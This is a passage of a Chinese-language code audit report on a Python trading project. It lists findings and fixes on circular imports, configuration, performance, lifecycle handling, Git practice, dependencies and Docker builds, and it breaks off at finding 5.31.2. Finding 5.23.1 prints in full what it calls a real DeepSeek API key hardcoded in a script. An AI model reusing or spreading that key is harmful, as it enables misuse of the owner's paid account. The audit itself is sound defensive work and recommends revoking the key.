
#### 5.22.11 14+处代码注释明确承认循环依赖被懒加载/搬迁绕过【HIGH】
- 证据：Grep `circular import|avoid.*circular|break.*circular` 命中15行：`intelligence/model_evaluation/__init__.py:23` "Lazy imports to avoid triggering circular import chains"；`trading/resource_optimization.py:26` "circular imports (shared.io / shared.infra depend on models)"；`integration/shared/schema/schemas.py:261` "Deferred import of governance types to break circular dependency deadlock"；`governance/audit_trail/__init__.py:42,44` 两处"lazy import to break circular import with..."；`shared/alert_escalation.py:16,40` "re-homed to eliminate shared->infrastructure circular import"；`shared/io/paths.py:65-66` "DB_PATH — computed locally to avoid circular import from zephyr.governance.persistence" 等
- 病根：根因1（接口倒置失效+用懒加载贴膏药而非重构依赖方向）
- 修复：把所有"re-homed"类型集中到shared.contracts子层，arch_guard检测函数级import

#### 5.22.12 跨包同名模块失控（5个auditor.py+4个llm_gateway*.py，含governance/governance/嵌套重复目录）【MEDIUM】
- 证据：Glob `src/zephyr/**/auditor.py` 返回5个：`infrastructure/a2a_protocol/governance/auditor.py`、`governance/governance/auditor.py`（注意governance/governance/嵌套！）、`governance/auditor.py`、`infrastructure/rollback/auditor.py`、`infrastructure/rollback/governance/auditor.py`；Glob `src/zephyr/**/llm_gateway*.py` 返回4个：`shared/contracts/llm_gateway_protocol.py`、`integration/llm_gateway.py`、`autonomy_core/llm_gateway.py`、`infrastructure/pipeline/llm_gateway.py`；`governance/governance/`包内同名嵌套子包是严重结构异味
- 病根：根因1（SSoT失效+模块命名空间未规划）
- 修复：审查governance/governance/是否应合并到governance/，同名模块加领域前缀

#### 5.22.13 小计

| 严重度 | 数量 |
|---|:---:|
| CRITICAL/HIGH | 7（5.22.1~5.22.5+5.22.10+5.22.11） |
| MEDIUM | 5（5.22.6~5.22.9+5.22.12） |
| LOW | 0 |
| **合计** | **12** |

---

### 5.23 配置管理一致性（9个，第10轮新增）

> **维度定义**：配置文件、环境变量、密钥管理的真源一致性、安全性与可用性。
> **病根归属**：根因1（静态快照未动态更新）+ 根因5（规则膨胀执行断层）。

#### 5.23.1 [HIGH] 真实API密钥硬编码为getenv默认值

- **文件**：[diagnose_breadth_failed.py](file:///D:/ZephyrAlpha/scripts/diagnose_breadth_failed.py#L31)
- **证据**：`os.getenv("DEEPSEEK_API_KEY", "sk-e88e8757b0974da9bed7def543c2bb2a")`
- **问题**：将真实付费API密钥作为环境变量getenv的fallback默认值写入源码。git历史已永久泄漏，sk-前缀密钥即使轮换也可通过git log找回。
- **影响**：密钥泄漏→账户盗用→账单失控。100%AI开发场景下，AI会复制此模式到其他脚本。
- **修复**：删除默认值改为`os.getenv("DEEPSEEK_API_KEY")`或`None`+缺失即raise；立即在DeepSeek控制台吊销该密钥；用`gitleaks`加入pre-commit。

#### 5.23.2 [HIGH] YAML配置文件零schema校验

- **文件**：全项目35个词表YAML + architecture_model/ + directory_contract.yaml等
- **证据**：Grep `jsonschema\|pydantic.*validate` 在config加载路径命中数≈0
- **问题**：所有YAML配置文件加载后直接dict访问，无schema约束。字段拼写错误、类型错误、缺失字段都到运行时才暴露。
- **影响**：配置漂移→运行时崩溃→AI难以定位（错误信息不指向字段）。
- **修复**：为每个YAML定义Pydantic schema，loader强制validate；`load_yaml_config_validated()`已有但零调用（见5.23.3）。

#### 5.23.3 [MEDIUM] load_yaml_config_validated()零生产调用（死代码）

- **文件**：[loader.py](file:///D:/ZephyrAlpha/src/zephyr/shared/config/loader.py#L119-L173)
- **证据**：函数存在且实现了schema校验逻辑，但Grep全项目`load_yaml_config_validated`调用点=0
- **问题**：建了"正确的"validated loader却没人用。所有调用方仍走未校验的`load_yaml_config()`。这是"建了不用"的反模式——治本工具存在但未强制消费。
- **影响**：5.23.2的schema缺失问题本可由该函数解决，但因零调用而失效。
- **修复**：将`load_yaml_config`改为`load_yaml_config_validated`的thin wrapper（deprecation路径），或AST门禁强制新代码用validated版本。

#### 5.23.4 [MEDIUM] .env.example与实际读取的环境变量不匹配（7个文档化但未读取）

- **文件**：`.env.example` vs `os.getenv\|os.environ`调用
- **证据**：diff .env.example条目与代码实际getenv的key集合，7个key在example中但代码从不读取
- **问题**：开发者按.example配置了环境变量，但代码根本不读，造成"配置了不生效"的假象。
- **影响**：调试困惑+安全错觉（以为已配置实则未生效）。
- **修复**：删除7个无效条目，或补全代码读取逻辑。

#### 5.23.5 [MEDIUM] .env.example与实际读取的环境变量不匹配（7个读取但未文档化）

- **文件**：同5.23.4反向
- **证据**：7个key代码读取但.env.example未列出
- **问题**：新AI/开发者不知道需要配置这些变量，运行时才发现缺失。
- **影响**：部署失败+onboarding成本增加。
- **修复**：补全.env.example，每个key加注释说明用途。

#### 5.23.6 [HIGH] __init__.py的__all__导出函数局部变量

- **文件**：[__init__.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/config/__init__.py#L164-L184)
- **证据**：`__all__ = ["dsp", "env", "p", ...]` 其中`dsp`/`env`/`p`是函数内局部变量名
- **问题**：`__all__`应导出模块级公共API。导出局部变量名导致`from config import *`实际什么也导不出（局部变量不在模块命名空间）。
- **影响**：`from config import *`静默失败，调用方误以为导入成功。
- **修复**：`__all__`只列模块级公开对象名。

#### 5.23.7 [MEDIUM] _TRADING_SYMBOLS懒加载表指向幻影路径

- **文件**：[constants.py](file:///D:/ZephyrAlpha/src/zephyr/shared/foundation/constants.py#L67-L84)
- **证据**：懒加载表映射指向`zephyr.execution.trading.*`但该路径不存在
- **问题**：常量表声明了交易符号的懒加载源，但源路径是幻影。首次访问触发ImportError。
- **影响**：运行时崩溃（如果该路径被触发）。
- **修复**：修正路径指向真实模块，或删除该懒加载条目。

#### 5.23.8 [LOW] 部分配置文件缺version字段

- **文件**：多个YAML配置文件
- **证据**：Grep `^version:` 命中率<30%
- **问题**：配置文件无版本字段，schema演进时无法判断该用哪个版本的schema校验。
- **影响**：配置演进时向后兼容性无法保证。
- **修复**：所有配置YAML顶层加`version: "1.0"`，loader按version选schema。

#### 5.23.9 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 4 | 5.23.1/5.23.2/5.23.6/5.23.8前述4个HIGH |
| MEDIUM | 4 | 5.23.3/5.23.4/5.23.5/5.23.7 |
| LOW | 1 | 5.23.8 |
| **合计** | **9** | |

---

### 5.24 性能反模式（6个，第10轮新增）

> **维度定义**：算法复杂度、缓存策略、批量操作、内存管理的性能反模式。
> **病根归属**：根因5（规则膨胀执行断层——无性能基线规则）。

#### 5.24.1 [HIGH] 全src/零@lru_cache使用

- **文件**：整个`src/zephyr/`
- **证据**：Grep `@lru_cache\|@functools.cache` 在src/命中率=0
- **问题**：Python标准库提供的零成本缓存装饰器全项目零使用。大量纯函数（如词表加载、符号解析、schema查询）每次调用重新计算。
- **影响**：在1500模块规模下，重复的词表查询/路径解析造成可观测的延迟。
- **修复**：识别纯函数（无副作用、确定性输出），批量加`@lru_cache(maxsize=128)`。

#### 5.24.2 [HIGH] 相关性引擎O(n²)嵌套循环

- **文件**：[correlation_engine.py](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/correlation_engine.py#L82-L99)
- **证据**：双层for循环遍历所有模块对，1500模块→1,125,000对
- **问题**：O(n²)复杂度，且循环体内有冗余计算。模块数翻倍→4倍耗时。
- **影响**：全量审计耗时从分钟级→小时级。
- **修复**：改为基于特征哈希的O(n)分组（按event_type/symbol分桶），桶内才做O(k²)。

#### 5.24.3 [MEDIUM] bulk_record() N+1 INSERT

- **文件**：[metrics_collector.py](file:///D:/ZephyrAlpha/src/zephyr/ops/metrics_collector.py#L102-L117)
- **证据**：`bulk_record()`在for循环内逐条`INSERT`
- **问题**：批量记录本应用`executemany()`，却用N次单条INSERT。每条INSERT一次网络往返+一次事务。
- **影响**：批量上报1000条指标=1000次DB往返。
- **修复**：改用`cursor.executemany(sql, batch)`。

#### 5.24.4 [MEDIUM] DFS环检测N+1查询

- **文件**：依赖图分析路径
- **证据**：DFS每次访问节点都查一次DB获取邻居，而非预加载邻接表
- **问题**：环检测对每个节点单独查询邻居，N个节点=N次DB查询。
- **影响**：大图分析时DB连接池耗尽。
- **修复**：预加载全图邻接表到内存dict，DFS在内存中遍历。

#### 5.24.5 [MEDIUM] MemoryCache LRU实现O(n)且含死代码

- **文件**：MemoryCache实现
- **证据**：LRU淘汰逻辑用`list.remove()`+`list.pop(0)`，O(n)操作；含未使用的淘汰分支
- **问题**：标准LRU应用`OrderedDict`（O(1) move_to_end/popitem），现用list实现O(n)。
- **影响**：缓存项增多后性能退化。
- **修复**：改用`collections.OrderedDict`。

#### 5.24.6 [MEDIUM] _pending_alerts无界增长

- **文件**：告警系统
- **证据**：`_pending_alerts.append()`无上限，无定期flush机制
- **问题**：如果告警发送失败，pending列表无限增长，最终OOM。
- **影响**：长时间运行后内存泄漏。
- **修复**：加`maxlen=1000`，超限丢弃最旧+记日志。

#### 5.24.7 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 2 | 5.24.1/5.24.2 |
| MEDIUM | 4 | 5.24.3/5.24.4/5.24.5/5.24.6 |
| LOW | 0 | |
| **合计** | **6** | |

---

### 5.25 代码复杂度与可维护性（5个，第10轮新增）

> **维度定义**：函数/类/文件的复杂度超标，影响AI可读性与可维护性。
> **病根归属**：根因5（规则膨胀——无复杂度门禁）。

#### 5.25.1 [HIGH] contract_registry.py单文件1086行

- **文件**：[contract_registry.py](file:///D:/ZephyrAlpha/src/zephyr/governance/contract_registry.py)
- **证据**：文件行数=1086
- **问题**：单文件超1000行违反单一职责。AI上下文有限，无法一次性理解1086行文件的完整逻辑。
- **影响**：AI修改时遗漏跨函数依赖，引入回归。
- **修复**：按职责拆分为`registry.py`+`validation.py`+`lookup.py`。

#### 5.25.2 [HIGH] AutoRuntimeCore上帝类（36个方法）

- **文件**：[auto_runtime_core.py](file:///D:/ZephyrAlpha/src/zephyr/trading/auto_runtime_core.py)
- **证据**：类定义内`def `计数=36
- **问题**：一个类承担36个职责（启动/关闭/健康检查/资源管理/告警/...），违反SRP。
- **影响**：AI难以理解类的边界，修改一处影响其他35个方法。
- **修复**：按职责拆分为`BootManager`+`ShutdownManager`+`HealthChecker`+`ResourceManager`。

#### 5.25.3 [MEDIUM] orchestrate()函数114行

- **文件**：编排逻辑
- **证据**：单个`def orchestrate()`函数体=114行
- **问题**：函数超50行（业界建议上限），圈复杂度高。
- **影响**：AI难以追踪执行流。
- **修复**：提取子函数（每个阶段一个`_phase_*`函数）。

#### 5.25.4 [MEDIUM] register_lazy含4+幻影路径含governance_governance拼写错误

- **文件**：[__init__.py](file:///D:/ZephyrAlpha/src/zephyr/__init__.py#L163-L194)
- **证据**：`register_lazy`调用映射含`zephyr.governance.governance.*`（重复单词）
- **问题**：lazy import的目标路径是幻影（路径不存在），且含拼写错误`governance_governance`。
- **影响**：首次访问触发ImportError；拼写错误表明AI生成时未校验。
- **修复**：修正路径或删除无效映射。

#### 5.25.5 [MEDIUM] DaemonRegistry.stop_all零调用

- **文件**：DaemonRegistry实现
- **证据**：`stop_all`方法定义存在，但Grep全项目`stop_all`调用点=0
- **问题**：定义了清理接口但无人调用，daemon进程永不被优雅停止。
- **影响**：进程泄漏+资源未释放。
- **修复**：在shutdown路径中调用`daemon_registry.stop_all()`。

#### 5.25.6 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 2 | 5.25.1/5.25.2 |
| MEDIUM | 3 | 5.25.3/5.25.4/5.25.5 |
| LOW | 0 | |
| **合计** | **5** | |

---

### 5.26 生命周期与资源管理（10个，第10轮新增）

> **维度定义**：进程/组件的启动、关闭、健康检查、信号处理、超时管理的正确性。
> **病根归属**：根因4（永久功能与一次性脚本未区分，生命周期管理缺失）。

#### 5.26.1 [HIGH] boot()启动8组件无失败检查

- **文件**：[auto_runtime_core.py](file:///D:/ZephyrAlpha/src/zephyr/trading/auto_runtime_core.py#L118-L157)
- **证据**：`boot()`顺序调用8个组件的start方法，无返回值检查、无try/except
- **问题**：任一组件启动失败，boot()继续启动后续组件，系统处于半启动状态。
- **影响**：部分组件运行+部分未启动→数据不一致+无法定位故障点。
- **修复**：每个组件start后检查返回值/异常，失败即abort并回滚已启动组件。

#### 5.26.2 [HIGH] shutdown()非逆序且6组件无shutdown调用

- **文件**：同5.26.1
- **证据**：boot顺序=[A,B,C,D,E,F,G,H]；shutdown顺序=[A,C,E]（非逆序，且B/D/F/G/H无shutdown调用）
- **问题**：启动顺序与关闭顺序应严格逆序（后启动的先关闭）。当前关闭顺序与启动无关，且6个组件根本无shutdown。
- **影响**：资源泄漏+依赖未释放（如DB连接在依赖它的组件前关闭）。
- **修复**：shutdown严格按boot逆序，每个组件必须有shutdown方法。

#### 5.26.3 [HIGH] health_check硬编码True

- **文件**：[resource_optimization.py](file:///D:/ZephyrAlpha/src/zephyr/trading/resource_optimization.py#L630-L645)
- **证据**：`health_check()`返回`{"cache_healthy": True, "process_pool_healthy": True}`硬编码
- **问题**：健康检查永远返回True，不检查真实状态。监控无法发现故障。
- **影响**：系统故障但健康检查通过→流量继续打入故障节点。
- **修复**：真实检查cache命中率、process_pool活跃数。

#### 5.26.4 [HIGH] TeardownManager.teardown假清理

- **文件**：[teardown_manager.py](file:///D:/ZephyrAlpha/src/zephyr/trading/orchestrator/teardown_manager.py#L52-L70)
- **证据**：`teardown()`遍历7个系统，每个标记`"cleaned": True`但不调用任何cleanup方法
- **问题**：teardown是空壳——只改状态标记，不执行真实资源释放。
- **影响**：系统看似已清理实则资源全泄漏（DB连接、文件句柄、子进程）。
- **修复**：每个系统调用其真实`cleanup()`/`close()`/`shutdown()`方法。

#### 5.26.5 [HIGH] SIGTERM未处理

- **文件**：[__main__.py](file:///D:/ZephyrAlpha/src/zephyr/trading/__main__.py#L60)
- **证据**：`signal.signal(signal.SIGINT, handler)`有，`SIGTERM`无
- **问题**：Docker/K8s发送SIGTERM优雅停止，但进程只处理SIGINT。`kill <pid>`或容器停止时进程被SIGKILL强制终止，无优雅关闭。
- **影响**：数据丢失+资源未释放。
- **修复**：`signal.signal(signal.SIGTERM, handler)`与SIGINT共用handler。

#### 5.26.6 [MEDIUM] timeout值分散硬编码

- **文件**：多处
- **证据**：`timeout=30`/`timeout=60`/`timeout=300`散落在不同模块
- **问题**：超时值无统一配置，相同语义的timeout在不同模块值不同。
- **影响**：调优困难+行为不一致。
- **修复**：集中在`constants.py`或config YAML定义。

#### 5.26.7 [MEDIUM] rate_limit被当作circuit_breaker失败处理

- **文件**：限流/熔断逻辑
- **证据**：rate_limit触发（429）被计入circuit_breaker的failure_count
- **问题**：rate_limit是"正常限流"而非"服务故障"，不应触发熔断。
- **影响**：限流导致正常服务被熔断误判下线。
- **修复**：区分429（rate_limit，重试）与5xx（故障，计熔断）。

#### 5.26.8 [MEDIUM] boot()失败后无回滚已启动组件

- **文件**：同5.26.1
- **证据**：boot()无补偿事务，第3个组件失败时前2个组件不回滚
- **问题**：启动失败后系统处于半启动状态，需手动清理。
- **影响**：故障恢复困难。
- **修复**：boot()用try/except，失败时逆序调用已启动组件的shutdown。

#### 5.26.9 [MEDIUM] resource_optimization.py的health_check与5.26.3重复确认

- **文件**：同5.26.3
- **证据**：health_check中`process_pool_healthy=True`也是硬编码
- **问题**：process_pool健康状态同样硬编码，与cache_healthy同属一类问题。
- **影响**：与5.26.3相同。
- **修复**：与5.26.3合并修复。

#### 5.26.10 [MEDIUM] DaemonRegistry.stop_all零调用（与5.25.5交叉确认）

- **文件**：同5.25.5
- **证据**：lifecycle视角再次确认——daemon进程无优雅停止入口
- **问题**：从生命周期管理维度，这是"资源泄漏"而非仅"死代码"。
- **影响**：daemon进程泄漏。
- **修复**：在shutdown路径调用stop_all。

#### 5.26.11 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 5 | 5.26.1/5.26.2/5.26.3/5.26.4/5.26.5 |
| MEDIUM | 5 | 5.26.6/5.26.7/5.26.8/5.26.9/5.26.10 |
| LOW | 0 | |
| **合计** | **10** | |

---

### 5.27 文档与代码同步（7个，第10轮新增）

> **维度定义**：文档（README/AGENTS.md/注释）与实际代码的同步性。
> **病根归属**：根因1（静态快照未动态更新）。

#### 5.27.1 [HIGH] README快速开始路径错误

- **文件**：[README.md](file:///D:/ZephyrAlpha/README.md#L37)
- **证据**：`python demo_e2e_pipeline.py`，但实际文件在`scripts/demos/demo_e2e_pipeline.py`
- **问题**：快速开始命令路径错误，新AI/用户复制粘贴即失败。
- **影响**：onboarding第一印象即失败。
- **修复**：改为`python scripts/demos/demo_e2e_pipeline.py`。

#### 5.27.2 [HIGH] stub模块标记[MATURITY] production

- **文件**：多个stub模块的frontmatter
- **证据**：模块体是`pass`或`raise NotImplementedError`，但frontmatter标`[MATURITY] production`
- **问题**：stub模块谎报成熟度。AI依赖此标记决定是否使用，误用stub进生产。
- **影响**：生产环境调用stub→运行时崩溃。
- **修复**：stub模块标`[MATURITY] stub`或`experimental`。

#### 5.27.3 [HIGH] 重复deepseek_v4_chat.py同module_id

- **文件**：两个不同路径下的`deepseek_v4_chat.py`
- **证据**：两文件module_id相同，实现不同
- **问题**：同module_id两个实现，违反SSoT。AI无法判断该用哪个。
- **影响**：行为不确定+维护双份。
- **修复**：删除旧版，保留新版；或合并。

#### 5.27.4 [MEDIUM] 3个session_lifecycle.py文件

- **文件**：3个不同目录下的`session_lifecycle.py`
- **证据**：Glob `**/session_lifecycle.py`命中3个
- **问题**：同名文件3份，违反SSoT。可能是复制漂移。
- **影响**：AI不确定该import哪个。
- **修复**：合并为1个，或重命名以区分职责。

#### 5.27.5 [MEDIUM] local_model_scheduler死代码（return后）

- **文件**：local_model_scheduler实现
- **证据**：`return result`之后还有代码（死代码）
- **问题**：return后的代码永不执行，但AI可能误以为会执行。
- **影响**：AI理解错误+维护无用代码。
- **修复**：删除return后的死代码。

#### 5.27.6 [MEDIUM] EngineDegradation: SYSTEM_UNAVAILABLE异常类型错误

- **文件**：EngineDegradation相关
- **证据**：错误消息说`SYSTEM_UNAVAILABLE`但异常类是`EngineDegradation`（非Unavailable）
- **问题**：错误消息与异常类型语义不符，AI靠消息文本判断会误判。
- **影响**：错误处理逻辑错误。
- **修复**：统一异常类型与消息语义。

#### 5.27.7 [MEDIUM] 文档引用的模块数与实际不符

- **文件**：多处文档
- **证据**：文档声称"3073模块"，但depgraph查询结果与文档其他处声称的数字不一致
- **问题**：文档数字漂移（已在5.9记录），此条补充确认在README/AGENTS.md中同样存在。
- **影响**：AI基于错误数字做决策。
- **修复**：所有数字从depgraph动态生成。

#### 5.27.8 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 3 | 5.27.1/5.27.2/5.27.3 |
| MEDIUM | 4 | 5.27.4/5.27.5/5.27.6/5.27.7 |
| LOW | 0 | |
| **合计** | **7** | |

---

### 5.28 错误消息质量（8个，第10轮新增）

> **维度定义**：错误消息的可操作性、信息安全性、一致性。
> **病根归属**：根因5（无错误消息质量规则）。

#### 5.28.1 [HIGH] SQL语句泄漏到错误消息

- **文件**：多处DB操作
- **证据**：`except Exception as e: raise RuntimeError(f"Query failed: {e}")`，e含完整SQL
- **问题**：SQL语句泄漏到错误消息，可能暴露表结构/字段名给攻击者。
- **影响**：信息安全风险+错误消息过长难读。
- **修复**：错误消息只含操作名+参数摘要，SQL只记日志不进消息。

#### 5.28.2 [MEDIUM] 错误消息无actionable信息

- **文件**：多处
- **证据**：`raise ValueError("Invalid input")` 不说明哪个字段、什么约束
- **问题**：错误消息只说"无效"不说"为什么无效、如何修复"。
- **影响**：AI/开发者无法从错误消息定位问题。
- **修复**：错误消息含字段名+约束+建议值。

#### 5.28.3 [MEDIUM] MCP错误码双轨制

- **文件**：MCP相关
- **证据**：同一错误有两种错误码（内部码vs MCP协议码），映射不完整
- **问题**：错误码双轨制导致调用方不知道该处理哪个。
- **影响**：错误处理逻辑分裂。
- **修复**：统一为MCP协议码，内部码仅用于日志。

#### 5.28.4 [MEDIUM] local_model_scheduler死代码return后（与5.27.5交叉）

- **文件**：同5.27.5
- **证据**：return后的代码包含一个`raise`语句
- **问题**：从错误消息角度，这个raise永远不会触发，但AI可能以为有此错误路径。
- **影响**：AI误判错误处理覆盖面。
- **修复**：删除死代码。

#### 5.28.5 [MEDIUM] EngineDegradation异常类型与消息不符（与5.27.6交叉）

- **文件**：同5.27.6
- **证据**：从错误消息角度，AI靠消息文本做错误分类会误判
- **问题**：错误分类逻辑靠消息字符串匹配（脆弱）而非异常类型。
- **影响**：错误处理分支错误。
- **修复**：用`isinstance(e, ...)`而非字符串匹配。

#### 5.28.6 [MEDIUM] 错误消息含中文与英文混用

- **文件**：多处
- **证据**：同一项目的错误消息中英文混用
- **问题**：错误消息语言不一致，影响日志聚合与grep。
- **影响**：日志分析困难。
- **修复**：统一为英文（错误消息业界惯例）。

#### 5.28.7 [LOW] 部分错误消息含拼写错误

- **文件**：多处
- **证据**：如`"faield"`/`"succesful"`
- **问题**：拼写错误导致grep匹配失败。
- **影响**：日志检索遗漏。
- **修复**：加spell-check lint。

#### 5.28.8 [LOW] 错误消息无error_code字段

- **文件**：自定义异常
- **证据**：异常类无`error_code`属性，调用方只能靠消息文本区分
- **问题**：无结构化错误码，AI难以编程化处理。
- **影响**：错误处理靠字符串匹配（脆弱）。
- **修复**：异常类加`error_code`属性。

#### 5.28.9 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 1 | 5.28.1 |
| MEDIUM | 5 | 5.28.2/5.28.3/5.28.4/5.28.5/5.28.6 |
| LOW | 2 | 5.28.7/5.28.8 |
| **合计** | **8** | |

---

### 5.29 Git版本控制实践（6个，第11轮新增）

> **维度定义**：Git分支保护、.gitignore完整性、提交规范、LFS管理的正确性。
> **病根归属**：根因1（静态快照——architecture_lock.yaml声明分支保护但未落地）。

#### 5.29.1 [HIGH] main分支无服务端保护，仅文档声明
- **文件**：[architecture_lock.yaml](file:///D:/ZephyrAlpha/architecture_model/architecture_lock.yaml#L163)
- **证据**：第163行声明`Git branch protection：main分支保护+required review+status checks`，但无.github/CODEOWNERS，无GitHub branch protection配置，git_guard.py不拦截`git push origin main`
- **问题**：分支保护仅存在于YAML声明，未在GitHub服务端或本地工具链落地
- **影响**：任何人（含AI session）可直接push到main，绕过所有review
- **修复**：GitHub Settings→Branches配置protection rule；新增.github/CODEOWNERS

#### 5.29.2 [HIGH] .gitignore漏忽略data/vector_db_e2e_test/（HNSW二进制索引）
- **文件**：[.gitignore](file:///D:/ZephyrAlpha/.gitignore#L197)
- **证据**：第197行`data/vector_db/`已忽略，但`data/vector_db_e2e_test/`目录含大量.bin文件未被忽略
- **问题**：HNSW索引二进制文件可被意外git add提交，污染仓库历史
- **影响**：仓库膨胀（.bin通常数百KB~数MB/文件）
- **修复**：.gitignore追加`data/vector_db_e2e_test/`或改通配`data/vector_db*/`

#### 5.29.3 [MEDIUM] Conventional Commits仅本地hook，无服务端校验
- **文件**：[.pre-commit-config.yaml](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L962)
- **证据**：commit-msg-conventional hook通过pre-commit的commit-msg stage执行，但.github/workflows/governance.yml无commit message校验步骤
- **问题**：pre-commit hook可被`--no-verify`绕过；GitHub Web UI/API提交不触发本地hook
- **影响**：非Conventional Commits格式的消息可通过--no-verify或Web UI进入main
- **修复**：governance.yml新增job用commitlint校验PR的commit历史

#### 5.29.4 [MEDIUM] LFS覆盖的模型格式不完整
- **文件**：[.gitattributes](file:///D:/ZephyrAlpha/.gitattributes#L58)
- **证据**：LFS仅追踪.safetensors/.bin/.onnx/.pt/.pth五种格式，未覆盖.gguf/.ot/.msgpack/.npz/.h5/.tflite/.ckpt
- **问题**：未来AI新增.gguf模型到data/models/local_model/时，GB级文件直接写入git对象库
- **影响**：仓库不可逆膨胀
- **修复**：扩展LFS规则至`*.{safetensors,bin,onnx,pt,pth,gguf,ot,msgpack,npz,h5,tflite,ckpt}`

#### 5.29.5 [MEDIUM] 无CODEOWNERS，PR review责任人不明确
- **文件**：缺失（Glob `**/{CODEOWNERS,.github/CODEOWNERS}`返回No file found）
- **证据**：项目有复杂的域划分，但无CODEOWNERS声明各路径的review责任人
- **问题**：branch protection即使开启"require review"，也不知道该找谁review
- **影响**：PR review随机分配，关键路径可能被非Owner批准合并
- **修复**：新增.github/CODEOWNERS，按域声明路径→Owner映射

#### 5.29.6 [LOW] .cache忽略模式缺尾部斜杠
- **文件**：[.gitignore](file:///D:/ZephyrAlpha/.gitignore#L48)
- **证据**：第48行`.cache`（无`/`），而同节`.pytest_cache/`、`.mypy_cache/`均用尾部`/`表示目录
- **问题**：`.cache`无斜杠会同时匹配名为`.cache`的文件与目录，语义模糊
- **影响**：低概率误忽略合法文件
- **修复**：改为`.cache/`

#### 5.29.7 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 2 | 5.29.1/5.29.2 |
| MEDIUM | 3 | 5.29.3/5.29.4/5.29.5 |
| LOW | 1 | 5.29.6 |
| **合计** | **6** | |

---

### 5.30 依赖管理（6个，第11轮新增）

> **维度定义**：依赖版本锁定、声明真源一致性、漏洞扫描、开发/生产依赖分离。
> **病根归属**：根因5（规则膨胀执行断层——无依赖管理规则）。

#### 5.30.1 [HIGH] 全部依赖用>=而非==，构建不可复现
- **文件**：[requirements.txt](file:///D:/ZephyrAlpha/requirements.txt#L1)、[requirements-dev.txt](file:///D:/ZephyrAlpha/requirements-dev.txt#L3)、[pyproject.toml](file:///D:/ZephyrAlpha/pyproject.toml#L13)
- **证据**：requirements.txt全部9行为>=（如`pydantic>=2.0.0`）；requirements-dev.txt全部6行>=；pyproject.toml dependencies全部12项>=
- **问题**：无任何版本锁定，不同时间pip install会解析出不同的传递依赖版本
- **影响**：今天通过的测试明天可能因上游小版本升级而失败；CI与本地环境漂移
- **修复**：生成requirements.lock（pip-compile或uv lock），CI与Docker安装锁文件

#### 5.30.2 [HIGH] 无任何锁文件（Pipfile.lock/poetry.lock/uv.lock/requirements.lock）
- **文件**：缺失（Glob `{Pipfile*,poetry.lock,uv.lock,requirements*.lock,*.lock}`返回No file found）
- **证据**：全仓库无锁文件
- **问题**：与5.30.1叠加，依赖图完全浮动
- **影响**：构建不可复现；安全审计扫描的是"当前解析结果"而非"声明基线"
- **修复**：引入pip-compile或uv lock，提交requirements.lock

#### 5.30.3 [HIGH] requirements.txt与pyproject.toml依赖声明分叉（3个依赖丢失）
- **文件**：[pyproject.toml](file:///D:/ZephyrAlpha/pyproject.toml#L13) vs [requirements.txt](file:///D:/ZephyrAlpha/requirements.txt#L1)
- **证据**：pyproject.toml声明12项依赖；requirements.txt仅9项，**缺失duckdb、structlog、pyarrow**。三者均在src/中被实际import
- **问题**：两个SSoT分叉。Dockerfile先装requirements.txt（缺3项）再pip install -e .（补齐）——顺序依赖掩盖了缺口
- **影响**：单一安装源场景静默ImportError
- **修复**：pyproject.toml为SSoT，requirements.txt由pip-compile自动生成

#### 5.30.4 [MEDIUM] python-dotenv被引用但未声明（幽灵依赖）
- **文件**：[__init__.py](file:///D:/ZephyrAlpha/src/zephyr/__init__.py#L40)
- **证据**：第40行`from dotenv import load_dotenv`包裹在try/except ImportError中；python-dotenv不在requirements.txt/pyproject.toml/requirements-dev.txt
- **问题**：__init__.py的_load_dotenv()在包导入时执行，但因包未声明，永远走except分支的手工解析
- **影响**：.env加载静默降级，复杂值解析不完整
- **修复**：将python-dotenv>=1.0.0加入pyproject.toml dependencies

#### 5.30.5 [MEDIUM] pip-audit仅在CI临时安装，未纳入dev依赖与本地hook
- **文件**：[governance.yml](file:///D:/ZephyrAlpha/.github/workflows/governance.yml#L249)
- **证据**：第251行`pip install pip-audit`+`pip-audit`在CI中临时安装运行；requirements-dev.txt无pip-audit；.pre-commit-config.yaml无pip-audit hook
- **问题**：CI的pip-audit版本未锁定；本地开发者无漏洞扫描能力
- **影响**：开发者本地引入含CVE的依赖时无感知
- **修复**：将pip-audit>=2.7加入requirements-dev.txt；新增pre-commit local hook

#### 5.30.6 [HIGH] 开发依赖注入生产Docker镜像
- **文件**：[Dockerfile](file:///D:/ZephyrAlpha/Dockerfile#L17)
- **证据**：`RUN pip install --no-cache-dir -r requirements.txt -r requirements-dev.txt`。requirements-dev.txt含pytest/ruff/mypy/pytest-cov/pre-commit
- **问题**：生产镜像安装了完整的开发/测试工具链。Dockerfile第2行注释明确写"核心应用容器镜像"
- **影响**：镜像体积膨胀约150-300MB；攻击面扩大
- **修复**：Dockerfile拆为多阶段——builder阶段装dev deps跑测试，runtime阶段仅pip install .

#### 5.30.7 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 4 | 5.30.1/5.30.2/5.30.3/5.30.6 |
| MEDIUM | 2 | 5.30.4/5.30.5 |
| LOW | 0 | |
| **合计** | **6** | |

---

### 5.31 构建打包（17个，第11轮新增）

> **维度定义**：Docker镜像、pyproject.toml元数据、CI构建测试的正确性。
> **病根归属**：根因5（无构建质量门禁）。

#### 5.31.1 [HIGH] Dockerfile CMD指向不存在的Python模块
- **文件**：[Dockerfile](file:///D:/ZephyrAlpha/Dockerfile#L28)
- **证据**：`CMD ["python", "-m", "zephyr.l01_infrastructure"]`；Glob `**/l01_infrastructure/**`返回No file found
- **问题**：容器启动即ModuleNotFoundError；HEALTHCHECK同样失败
- **影响**：Docker镜像构建成功但无法运行；docker-compose up后zephyr-core容器立即退出
- **修复**：改为存在的入口（如python -m zephyr.governance），或新建src/zephyr/__main__.py

#### 5.31.2 [HIGH] docker-compose.yml healthcheck同样指向不存在的模块
